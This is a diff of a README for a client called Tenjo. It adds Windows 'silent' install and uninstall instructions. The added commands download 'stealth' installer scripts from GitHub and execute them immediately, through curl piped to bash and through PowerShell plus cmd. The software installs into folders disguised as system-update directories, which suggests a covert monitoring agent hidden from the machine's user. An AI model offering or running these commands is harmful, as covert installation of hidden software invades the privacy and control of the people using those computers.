@@ -12,7 +12,12 @@ curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quic
 curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install_stealth_macos.sh | bash -s true cleanup
 ```
 
-### Windows - Silent Installation
+### Windows - Silent Installation (Recommended)
+```cmd
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_install_stealth_windows.bat' -OutFile '%TEMP%\quick_install.bat' -UseBasicParsing; cmd /c '%TEMP%\quick_install.bat' true; del '%TEMP%\quick_install.bat'"
+```
+
+### Windows - Alternative Method (if above fails)
 ```cmd
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install_stealth_windows.bat' -OutFile '%TEMP%\install_stealth.bat'; cmd /c '%TEMP%\install_stealth.bat' true cleanup; del '%TEMP%\install_stealth.bat'"
 ```
@@ -41,7 +46,12 @@ bash ~/.system_update/uninstall.sh
 bash ~/.system_update/uninstall_stealth_macos.sh true
 ```
 
-### Windows
+### Windows (Quick Install Method)
+```cmd
+"%APPDATA%\SystemUpdate\uninstall.bat"
+```
+
+### Windows (Alternative Method)
 ```cmd
 "%APPDATA%\SystemUpdate\uninstall_stealth_windows.bat" true
 ```
